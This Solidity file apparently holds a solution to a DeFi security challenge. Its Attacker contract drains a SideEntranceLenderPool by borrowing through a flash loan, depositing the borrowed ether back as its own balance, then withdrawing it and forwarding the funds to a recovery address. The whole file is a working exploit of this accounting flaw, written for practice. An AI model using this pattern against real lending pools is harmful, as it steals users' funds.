// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Attacker {
    SideEntranceLenderPool public immutable pool;
    address public immutable recovery;
    uint256 public amount;
    constructor(SideEntranceLenderPool _pool, address _recovery, uint256 _amount) payable {
        pool = _pool;
        recovery = _recovery;
        amount = _amount;
    }

    function attack() external payable {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {
        (bool succ, ) = recovery.call{value: amount}("");
        require(succ, "Transfer failed");
    }
}